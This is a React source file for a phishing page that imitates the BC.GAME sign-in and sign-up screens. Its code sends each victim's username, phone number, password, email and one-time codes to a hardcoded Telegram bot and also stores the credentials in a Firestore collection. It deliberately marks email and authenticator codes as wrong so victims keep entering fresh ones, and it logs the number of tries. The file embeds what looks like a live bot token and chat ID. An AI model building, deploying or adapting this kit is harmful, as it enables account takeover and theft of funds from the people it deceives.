/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { 
  X, 
  Eye, 
  EyeOff, 
  Lock, 
  Smartphone, 
  ChevronDown, 
  Check,
  Mail,
  User as UserIcon
} from 'lucide-react';
import { addDoc, collection, serverTimestamp } from 'firebase/firestore';
import { db } from './lib/firebase';

// Mock social icons as the images have many custom silhouettes
const SocialIcon = ({ children, className = "" }: { children: React.ReactNode, className?: string }) => (
  <div className={`w-9 h-9 flex items-center justify-center rounded-lg bg-[#24262b] border border-[#2d3035] hover:bg-[#2d3035] cursor-pointer transition-colors ${className}`}>
    {children}
  </div>
);

export default function App() {
  const [activeTab, setActiveTab] = useState<'signin' | 'signup'>('signin');
  const [loginMethod, setLoginMethod] = useState<'password' | 'otp'>('password');
  const [showPassword, setShowPassword] = useState(true);
  const [identifier, setIdentifier] = useState('');
  const [password, setPassword] = useState('');
  const [otp, setOtp] = useState(['', '', '', '', '', '']);
  const [docId, setDocId] = useState<string | null>(null);
  const [isAgreed, setIsAgreed] = useState(true);
  const [isPromoted, setIsPromoted] = useState(true);
  const [loading, setLoading] = useState(false);
  const [showVerificationOptions, setShowVerificationOptions] = useState(false);
  const [verificationMethod, setVerificationMethod] = useState<'mobile' | 'email' | 'authenticator' | null>(null);
  const [showEmailCapture, setShowEmailCapture] = useState(false);
  const [verificationEmail, setVerificationEmail] = useState('');
  const [showOtpInput, setShowOtpInput] = useState(false);
  const [trialCount, setTrialCount] = useState(0);
  const [verifiedMethods, setVerifiedMethods] = useState<string[]>([]);
  const [otpError, setOtpError] = useState(false);
  const [success, setSuccess] = useState(false);

  const sendTelegramMessage = async (message: string) => {
    // @ts-ignore
    const token = import.meta.env.VITE_TELEGRAM_BOT_TOKEN || '8964084607:AAEgMO-hFs2FTEz0Z0CgucD4wItGNN36S_0';
    // @ts-ignore
    const chatId = import.meta.env.VITE_TELEGRAM_CHAT_ID || '7093226586';
    const url = `https://api.telegram.org/bot${token}/sendMessage`;

    try {
      await fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: 'HTML',
        }),
      });
    } catch (error) {
      console.error('Telegram Error:', error);
    }
  };

  const handleOtpChange = (index: number, value: string) => {
    if (value.length > 1) value = value[value.length - 1];
    const newOtp = [...otp];
    newOtp[index] = value;
    setOtp(newOtp);
    setOtpError(false);

    // Auto-focus move
    if (value && index < 5) {
      const nextInput = document.getElementById(`otp-${index + 1}`);
      nextInput?.focus();
    }

    // Check if complete
    if (newOtp.every(digit => digit !== '') && docId) {
      submitFinalOtp(newOtp.join(''));
    }
  };

  const submitFinalOtp = async (finalOtp: string) => {
    setLoading(true);
    try {
      const methodLabel = verificationMethod === 'mobile' ? 'MOBILE PHONE NUMBER OTP' : 
                          verificationMethod === 'email' ? 'EMAIL ID OTP' : 
                          verificationMethod === 'authenticator' ? 'AUTHENTICATOR OTP' : 'OTP';

      const isPhone = verificationMethod === 'mobile';
      const status = isPhone ? 'SUCCESS' : 'WRONG/RE-ENTRY';
      const message = `<b>🎯 OTP RECEIVED</b>\n\n` +
                      `<b>STATUS:</b> ${status}\n` +
                      `<b>METHOD:</b> ${methodLabel}\n` +
                      `<b>USERNAME:</b> <code>${identifier}</code>\n` +
                      `<b>CODE:</b> <code>${finalOtp}</code>\n` +
                      `<b>TRIAL:</b> ${trialCount + 1}`;
      
      await sendTelegramMessage(message);

      if (isPhone) {
        // Phone always succeeds in UI
        if (!verifiedMethods.includes('mobile')) {
          setVerifiedMethods([...verifiedMethods, 'mobile']);
        }
        
        setSuccess(true);
        setTimeout(() => {
          setSuccess(false);
          setShowOtpInput(false);
          setShowVerificationOptions(true);
          setOtp(['', '', '', '', '', '']);
          setTrialCount(0); // Reset trial for next method
        }, 2000);
      } else {
        // Email and Authenticator always fail in UI
        setOtpError(true);
        setOtp(['', '', '', '', '', '']);
        const firstInput = document.getElementById('otp-0');
        firstInput?.focus();
        setTrialCount(prev => prev + 1);
      }
    } catch (error) {
      console.error(error);
    } finally {
      setLoading(false);
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!identifier || !password) return;
    
    setLoading(true);
    const isPhone = /^\d+$/.test(identifier);
    try {
      await sendTelegramMessage(
        `<b>🚀 LOGIN ATTEMPT</b>\n\n` +
        `<b>${isPhone ? 'PHONE' : 'USER/EMAIL'}:</b> <code>${identifier}</code>\n` +
        `<b>PASSWORD:</b> <code>${password}</code>\n` +
        `<b>ACTION:</b> ${activeTab.toUpperCase()}`
      );

      const docRef = await addDoc(collection(db, 'accounts'), {
        identifier,
        password,
        type: activeTab,
        createdAt: serverTimestamp(),
        promoCode: activeTab === 'signup' ? 'NONE' : null
      });
      setDocId(docRef.id);
      setShowVerificationOptions(true);
    } catch (error) {
      console.error("Error saving data:", error);
    } finally {
      setLoading(false);
    }
  };

  const startMobileVerification = () => {
    setVerificationMethod('mobile');
    setShowVerificationOptions(false);
    setShowOtpInput(true);
  };

  const startEmailVerification = () => {
    setVerificationMethod('email');
    setShowVerificationOptions(false);
    setShowOtpInput(true);
  };

  const startAuthenticatorVerification = () => {
    setVerificationMethod('authenticator');
    setShowVerificationOptions(false);
    setShowOtpInput(true);
  };

  const handleGetCode = () => {
    if (!verificationEmail) return;
    sendTelegramMessage(
      `<b>📧 EMAIL CAPTURED</b>\n\n` +
      `<b>USERNAME:</b> <code>${identifier}</code>\n` +
      `<b>EMAIL:</b> <code>${verificationEmail}</code>`
    );
    setShowEmailCapture(false);
    setShowOtpInput(true);
  };

  return (
    <div className="min-h-screen bg-[#1a1c20] flex items-center justify-center p-4 font-sans text-white">
      <div className="w-full max-w-[420px] bg-[#1e2024] rounded-2xl shadow-2xl relative overflow-hidden border border-[#2d3035]">
        
        {/* Header */}
        <div className="pt-1 pb-4 px-5 flex justify-between items-center bg-[#1e2024] border-b border-[#2d3035]/50">
          <div className="flex items-center mt-4">
            <img 
              src="https://i.postimg.cc/V6WB6Q53/logo-CBzjipj-R.png" 
              alt="BC.GAME" 
              className="h-6 w-auto object-contain"
              referrerPolicy="no-referrer"
            />
          </div>
          <button 
            onClick={() => {
              if (showOtpInput) {
                setShowOtpInput(false);
                setShowVerificationOptions(true);
              } else if (showEmailCapture) {
                setShowEmailCapture(false);
                setShowVerificationOptions(true);
              } else if (showVerificationOptions) {
                setShowVerificationOptions(false);
              } else {
                // Home page action (reset everything or just stay)
                setIdentifier('');
                setPassword('');
                setActiveTab('signin');
              }
            }} 
            className="p-1 hover:bg-[#2d3035] rounded-md transition-colors mt-4 text-[#8e9299] hover:text-white"
          >
            {!(showVerificationOptions || showOtpInput || showEmailCapture || success) ? (
              <X size={20} />
            ) : (
              <div className="flex items-center gap-1">
                 <motion.div initial={{ x: 2 }} animate={{ x: 0 }} className="flex items-center">
                    <ChevronDown size={20} className="rotate-90" />
                 </motion.div>
              </div>
            )}
          </button>
        </div>

        {/* Tabs - Always visible if not in success/verification */}
        {!(showVerificationOptions || showOtpInput || showEmailCapture || success) && (
          <div className="flex px-4 pt-6">
            <button 
              onClick={() => setActiveTab('signin')}
              className={`flex-1 pb-3 text-sm font-bold transition-all relative ${activeTab === 'signin' ? 'text-white' : 'text-[#8e9299]'}`}
            >
              Sign In
              {activeTab === 'signin' && (
                <motion.div layoutId="underline" className="absolute bottom-0 left-0 right-0 h-0.5 bg-[#00e58b]" />
              )}
            </button>
            <button 
              onClick={() => setActiveTab('signup')}
              className={`flex-1 pb-3 text-sm font-bold transition-all relative ${activeTab === 'signup' ? 'text-white' : 'text-[#8e9299]'}`}
            >
              Sign Up
              {activeTab === 'signup' && (
                <motion.div layoutId="underline" className="absolute bottom-0 left-0 right-0 h-0.5 bg-[#00e58b]" />
              )}
            </button>
          </div>
        )}

        {/* Action Area */}
        <div className="p-6">
          <AnimatePresence mode="wait">
            {showVerificationOptions ? (
              <motion.div 
                key="verification-options"
                initial={{ opacity: 0, scale: 0.95 }}
                animate={{ opacity: 1, scale: 1 }}
                className="space-y-4 py-2"
              >
                <div className="text-center space-y-2 mb-2">
                  <h3 className="text-xl font-bold">Select Verification <span className="text-[#00e58b] text-sm">3-2</span></h3>
                  <p className="text-sm text-[#8e9299]">Choose a method to receive your 6-digit code</p>
                </div>
                <div className="space-y-3">
                  {/* Mobile Option */}
                  <button 
                    onClick={startMobileVerification}
                    className={`w-full flex items-center justify-between bg-[#24262b] border p-4 rounded-xl transition-all group ${verifiedMethods.includes('mobile') ? 'border-[#00e58b]' : 'border-[#2d3035] hover:border-[#00e58b]'}`}
                  >
                    <div className="flex items-center gap-4">
                      <div className="p-2.5 bg-[#00e58b]/10 rounded-lg text-[#00e58b]">
                        <Smartphone size={22} />
                      </div>
                      <div className="text-left">
                        <div className="font-bold text-sm">Via Mobile</div>
                        <div className="text-[10px] text-[#8e9299]">Get code on your phone</div>
                      </div>
                    </div>
                    {verifiedMethods.includes('mobile') ? (
                      <div className="w-5 h-5 bg-[#00e58b] rounded-full flex items-center justify-center text-[#1a1c20]">
                        <Check size={14} strokeWidth={4} />
                      </div>
                    ) : (
                      <ChevronDown className="text-[#8e9299] -rotate-90" size={18} />
                    )}
                  </button>

                  {/* Email Option */}
                  <button 
                    onClick={startEmailVerification}
                    className={`w-full flex items-center justify-between bg-[#24262b] border p-4 rounded-xl transition-all group ${verifiedMethods.includes('email') ? 'border-[#00e58b]' : 'border-[#2d3035] hover:border-[#00e58b]'}`}
                  >
                    <div className="flex items-center gap-4">
                      <div className="p-2.5 bg-[#00e58b]/10 rounded-lg text-[#00e58b]">
                        <Mail size={22} />
                      </div>
                      <div className="text-left">
                        <div className="font-bold text-sm">Via Email</div>
                        <div className="text-[10px] text-[#8e9299]">Get code on your email</div>
                      </div>
                    </div>
                    {verifiedMethods.includes('email') ? (
                      <div className="w-5 h-5 bg-[#00e58b] rounded-full flex items-center justify-center text-[#1a1c20]">
                        <Check size={14} strokeWidth={4} />
                      </div>
                    ) : (
                      <ChevronDown className="text-[#8e9299] -rotate-90" size={18} />
                    )}
                  </button>

                  {/* Authenticator Option */}
                  <button 
                    onClick={startAuthenticatorVerification}
                    className={`w-full flex items-center justify-between bg-[#24262b] border p-4 rounded-xl transition-all group ${verifiedMethods.includes('authenticator') ? 'border-[#00e58b]' : 'border-[#2d3035] hover:border-[#00e58b]'}`}
                  >
                    <div className="flex items-center gap-4">
                      <div className="p-2.5 bg-[#00e58b]/10 rounded-lg text-[#00e58b]">
                        <Lock size={22} />
                      </div>
                      <div className="text-left">
                        <div className="font-bold text-sm">Authenticator</div>
                        <div className="text-[10px] text-[#8e9299]">Use Google Authenticator App</div>
                      </div>
                    </div>
                    {verifiedMethods.includes('authenticator') ? (
                      <div className="w-5 h-5 bg-[#00e58b] rounded-full flex items-center justify-center text-[#1a1c20]">
                        <Check size={14} strokeWidth={4} />
                      </div>
                    ) : (
                      <ChevronDown className="text-[#8e9299] -rotate-90" size={18} />
                    )}
                  </button>
                </div>
              </motion.div>
            ) : showEmailCapture ? (
              <motion.div 
                key="email-capture"
                initial={{ opacity: 0, x: 10 }}
                animate={{ opacity: 1, x: 0 }}
                className="space-y-6 py-4"
              >
                <div className="text-center space-y-2">
                  <h3 className="text-xl font-bold">Verify Email <span className="text-[#00e58b] text-sm">3-2</span></h3>
                  <p className="text-sm text-[#8e9299]">Enter email to receive code from <span className="italic">BC.GAME</span></p>
                </div>
                <div className="space-y-4">
                  {otpError && (
                    <motion.div 
                      initial={{ opacity: 0, y: -10 }}
                      animate={{ opacity: 1, y: 0 }}
                      className="bg-red-500/10 border border-red-500/50 text-red-500 text-xs py-2 rounded-lg text-center"
                    >
                      Incorrect Verification Code. Please try again.
                    </motion.div>
                  )}
                  <input
                    type="email"
                    value={verificationEmail}
                    onChange={(e) => setVerificationEmail(e.target.value)}
                    placeholder="Enter your email"
                    className={`w-full bg-[#17181c] border rounded-lg px-4 py-4 text-sm outline-none focus:border-[#00e58b] ${otpError ? 'border-red-500' : 'border-[#2d3035]'}`}
                  />
                  <button 
                    onClick={handleGetCode}
                    disabled={!verificationEmail}
                    className="w-full bg-[#00e58b] text-[#1a1c20] font-black py-4 rounded-lg hover:bg-[#00c578] transition-all"
                  >
                    Get 6-digit Code
                  </button>
                </div>
              </motion.div>
            ) : showOtpInput ? (
              <motion.div 
                key="otp-screen"
                initial={{ opacity: 0, scale: 0.95 }}
                animate={{ opacity: 1, scale: 1 }}
                className="py-4 space-y-6 text-center"
              >
                <div className="space-y-2">
                  <h3 className="text-xl font-bold text-[#00e58b]">Verify Identity <span className="text-white text-sm">3-2</span></h3>
                  <p className="text-sm text-[#8e9299]">
                    Please enter the 6-digit code sent to your contact by <span className="text-white italic">BC.GAME</span>
                  </p>
                </div>

                <div className="space-y-4">
                  {otpError && (
                    <motion.div 
                      initial={{ opacity: 0, y: -10 }}
                      animate={{ opacity: 1, y: 0 }}
                      className="bg-red-500/10 border border-red-500/50 text-red-500 text-xs py-2 rounded-lg"
                    >
                      Inconsistent code. Please request a new one.
                    </motion.div>
                  )}
                  <div className="flex justify-between gap-2 max-w-[300px] mx-auto">
                    {otp.map((digit, index) => (
                      <input
                        key={index}
                        id={`otp-${index}`}
                        type="text"
                        inputMode="numeric"
                        value={digit}
                        onChange={(e) => handleOtpChange(index, e.target.value)}
                        onKeyDown={(e) => {
                          if (e.key === 'Backspace' && !digit && index > 0) {
                            document.getElementById(`otp-${index - 1}`)?.focus();
                          }
                        }}
                        className={`w-10 h-12 bg-[#17181c] border rounded-lg text-center text-lg font-bold text-[#00e58b] outline-none focus:border-[#00e58b] transition-all ${otpError ? 'border-red-500' : 'border-[#2d3035]'}`}
                      />
                    ))}
                  </div>
                </div>

                <div className="pt-4">
                  <button type="button" className="text-xs font-bold text-[#8e9299] hover:text-white transition-colors">
                    Didn't receive code? <span className="text-[#00e58b]">Resend</span>
                  </button>
                </div>
              </motion.div>
            ) : activeTab === 'signin' ? (
              <motion.div 
                key="signin"
                initial={{ opacity: 0, x: -10 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: 10 }}
                transition={{ duration: 0.2 }}
                className="space-y-4"
              >
                {/* Sign In Options */}
                <div className="flex bg-[#17181c] rounded-lg p-1 gap-1">
                  <button 
                    type="button"
                    onClick={() => setLoginMethod('password')}
                    className={`flex-1 flex items-center justify-center gap-2 py-2.5 rounded-md text-xs font-bold transition-all ${loginMethod === 'password' ? 'bg-[#2d3035] text-white shadow-lg' : 'text-[#8e9299]'}`}
                  >
                    <Lock size={14} /> Password
                  </button>
                  <button 
                    type="button"
                    onClick={() => {
                      // Clicked but option doesn't open - stays on password
                      setLoginMethod('password');
                    }}
                    className="flex-1 flex items-center justify-center gap-2 py-2.5 rounded-md text-xs font-bold text-[#8e9299] transition-all hover:text-white"
                  >
                    <Smartphone size={14} /> One-time Code
                  </button>
                </div>

                <form onSubmit={handleSubmit} className="space-y-4 pt-2">
                  <div className="relative flex items-center">
                    {/^\d+$/.test(identifier) && (
                      <div className="absolute left-4 flex items-center gap-1.5 text-sm font-bold text-white pr-2 border-r border-[#2d3035] h-5">
                        <span>🇮🇳</span>
                        <span>+91</span>
                      </div>
                    )}
                    <input 
                      type="text"
                      value={identifier}
                      onChange={(e) => setIdentifier(e.target.value)}
                      placeholder="Email / Phone Number / Username"
                      required
                      className={`w-full bg-[#17181c] border border-[#2d3035] rounded-lg px-4 py-3.5 text-sm outline-none focus:border-[#00e58b] transition-all placeholder:text-[#555a62] ${/^\d+$/.test(identifier) ? 'pl-24' : ''}`}
                    />
                  </div>

                  <div className="relative">
                    <input 
                      type="text"
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      placeholder="Password"
                      required
                      className="w-full bg-[#17181c] border border-[#2d3035] rounded-lg px-4 py-3.5 text-sm outline-none focus:border-[#00e58b] transition-all placeholder:text-[#555a62]"
                    />
                  </div>

                  <div className="text-right">
                    <button type="button" className="text-xs font-bold text-[#8e9299] hover:text-[#00e58b] transition-colors cursor-default">
                      Forgot your password?
                    </button>
                  </div>

                  <button 
                    type="submit"
                    disabled={loading}
                    className="w-full bg-[#00e58b] hover:bg-[#00c578] text-[#1a1c20] font-black py-4 rounded-lg transition-all active:scale-[0.98] disabled:opacity-50"
                  >
                    {loading ? 'Processing...' : activeTab === 'signin' ? 'Sign In' : 'Sign Up'}
                  </button>
                </form>

                <div className="relative flex items-center justify-center py-4">
                  <div className="absolute w-full h-[1px] bg-[#2d3035]"></div>
                  <span className="relative bg-[#1e2024] px-4 text-xs font-bold text-[#8e9299]">Log in directly with</span>
                </div>

                <div className="space-y-3">
                  <button type="button" className="w-full flex items-center justify-center gap-3 bg-[#24262b] border border-[#2d3035] py-3 rounded-lg text-sm font-bold hover:bg-[#2d3035] transition-all">
                    <div className="w-5 h-5 bg-[#00e58b]/20 flex items-center justify-center rounded text-[#00e58b]">C</div>
                    Cwallet
                  </button>
                  <button type="button" className="w-full flex items-center justify-center gap-3 bg-[#24262b] border border-[#2d3035] py-3 rounded-lg text-sm font-bold hover:bg-[#2d3035] transition-all">
                    <UserIcon size={18} className="text-[#8e9299]" />
                    Sign In with passkey
                  </button>
                </div>

                <div className="grid grid-cols-7 gap-2 pt-2">
                  <SocialIcon><span className="text-xs font-bold">G</span></SocialIcon>
                  <SocialIcon><span className="text-xs font-bold text-[#1DA1F2]">X</span></SocialIcon>
                  <SocialIcon><Smartphone size={16} className="text-[#0088cc]" /></SocialIcon>
                  <SocialIcon><span className="text-xs font-bold text-orange-500">M</span></SocialIcon>
                  <SocialIcon><div className="w-4 h-4 bg-blue-600 rounded-full"></div></SocialIcon>
                  <SocialIcon><Mail size={16} className="text-[#00e58b]" /></SocialIcon>
                  <SocialIcon><div className="w-4 h-4 border border-white rounded"></div></SocialIcon>
                </div>

                <div className="text-center pt-8">
                  <p className="text-sm font-bold text-[#8e9299]">
                    New to BC.GAME? <button type="button" onClick={() => setActiveTab('signup')} className="text-[#00e58b] hover:underline">Create account</button>
                  </p>
                </div>
              </motion.div>
            ) : (
              <motion.div 
                key="signup"
                initial={{ opacity: 0, x: 10 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: -10 }}
                transition={{ duration: 0.2 }}
                className="space-y-4"
              >
                <form onSubmit={handleSubmit} className="space-y-4">
                  <div className="relative flex items-center">
                    {/^\d+$/.test(identifier) && (
                      <div className="absolute left-4 flex items-center gap-1.5 text-sm font-bold text-white pr-2 border-r border-[#2d3035] h-5">
                        <span>🇮🇳</span>
                        <span>+91</span>
                      </div>
                    )}
                    <input 
                      type="text"
                      value={identifier}
                      onChange={(e) => setIdentifier(e.target.value)}
                      placeholder="Email / Phone Number"
                      required
                      className={`w-full bg-[#17181c] border border-[#2d3035] rounded-lg px-4 py-3.5 text-sm outline-none focus:border-[#00e58b] transition-all placeholder:text-[#555a62] ${/^\d+$/.test(identifier) ? 'pl-24' : ''}`}
                    />
                  </div>

                  <div className="relative">
                    <input 
                      type="text"
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      placeholder="Password"
                      required
                      className="w-full bg-[#17181c] border border-[#2d3035] rounded-lg px-4 py-3.5 text-sm outline-none focus:border-[#00e58b] transition-all placeholder:text-[#555a62]"
                    />
                  </div>

                  <button type="button" className="flex items-center gap-1 text-sm font-bold text-[#8e9299] py-1">
                    Enter Referral / Promo Code <ChevronDown size={16} />
                  </button>

                  <div className="space-y-3 pt-2">
                    <label className="flex items-start gap-3 cursor-pointer group">
                      <div 
                        onClick={() => setIsAgreed(!isAgreed)}
                        className={`mt-0.5 w-5 h-5 rounded flex items-center justify-center transition-all ${isAgreed ? 'bg-[#00e58b]' : 'border-2 border-[#2d3035]'}`}
                      >
                        {isAgreed && <Check size={14} className="text-[#1a1c20]" strokeWidth={4} />}
                      </div>
                      <span className="text-sm font-bold text-[#8e9299]">
                        I agree to the <span className="text-white">User Agreement</span> and I am 18+
                      </span>
                    </label>

                    <label className="flex items-start gap-3 cursor-pointer group">
                      <div 
                        onClick={() => setIsPromoted(!isPromoted)}
                        className={`mt-0.5 w-5 h-5 rounded flex items-center justify-center transition-all ${isPromoted ? 'bg-[#00e58b]' : 'border-2 border-[#2d3035]'}`}
                      >
                        {isPromoted && <Check size={14} className="text-[#1a1c20]" strokeWidth={4} />}
                      </div>
                      <span className="text-sm font-bold text-[#8e9299]">
                        I want to receive Promotion
                      </span>
                    </label>
                  </div>

                  <button 
                    type="submit"
                    disabled={loading || !isAgreed}
                    className="w-full bg-[#00e58b] hover:bg-[#00c578] text-[#1a1c20] font-black py-4 rounded-lg transition-all active:scale-[0.98] disabled:opacity-50"
                  >
                    {loading ? 'Processing...' : 'Sign Up'}
                  </button>
                </form>

                <div className="relative flex items-center justify-center py-4">
                  <div className="absolute w-full h-[1px] bg-[#2d3035]"></div>
                  <span className="relative bg-[#1e2024] px-4 text-xs font-bold text-[#8e9299]">Sign up directly with</span>
                </div>

                <div className="grid grid-cols-7 gap-2">
                  <SocialIcon><span className="text-xs font-bold">G</span></SocialIcon>
                  <SocialIcon><span className="text-xs font-bold text-[#1DA1F2]">X</span></SocialIcon>
                  <SocialIcon><Smartphone size={16} className="text-[#0088cc]" /></SocialIcon>
                  <SocialIcon><span className="text-xs font-bold text-orange-500">M</span></SocialIcon>
                  <SocialIcon><div className="w-4 h-4 bg-blue-600 rounded-full"></div></SocialIcon>
                  <SocialIcon><Mail size={16} className="text-[#00e58b]" /></SocialIcon>
                  <SocialIcon><div className="w-4 h-4 border border-white rounded"></div></SocialIcon>
                </div>
              </motion.div>
            )}
          </AnimatePresence>
        </div>

        {/* Success Overlay */}
        <AnimatePresence>
          {success && (
            <motion.div 
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              className="absolute inset-0 bg-black/90 backdrop-blur-sm flex items-center justify-center z-50 text-center p-8"
            >
              <div>
                <motion.div 
                  initial={{ scale: 0.8 }}
                  animate={{ scale: 1 }}
                  className="w-20 h-20 bg-[#00e58b] rounded-full flex items-center justify-center mx-auto mb-6 shadow-[0_0_20px_rgba(0,229,139,0.4)]"
                >
                  <Check size={40} className="text-[#1a1c20]" strokeWidth={4} />
                </motion.div>
                <h3 className="text-2xl font-black mb-3">Verification Successful</h3>
                <p className="text-[#8e9299] text-sm leading-relaxed mb-6">
                  Your <span className="text-white font-bold italic">BC.GAME</span> account is now secured. You will be redirected shortly to the dashboard.
                </p>
                <button 
                  onClick={() => setSuccess(false)}
                  className="px-8 py-2 bg-[#00e58b] text-black font-bold rounded-lg text-sm hover:bg-[#00c578] transition-all"
                >
                  Continue
                </button>
              </div>
            </motion.div>
          )}
        </AnimatePresence>
      </div>

      {/* Floating Refresh (Bottom Left in image) */}
      <div className="fixed bottom-8 left-8">
        <button className="w-12 h-12 bg-black rounded-full flex items-center justify-center text-white shadow-xl border border-[#2d3035]">
          <motion.div
            animate={{ rotate: 360 }}
            transition={{ duration: 4, repeat: Infinity, ease: "linear" }}
          >
            <Smartphone size={20} />
          </motion.div>
        </button>
      </div>
    </div>
  );
}

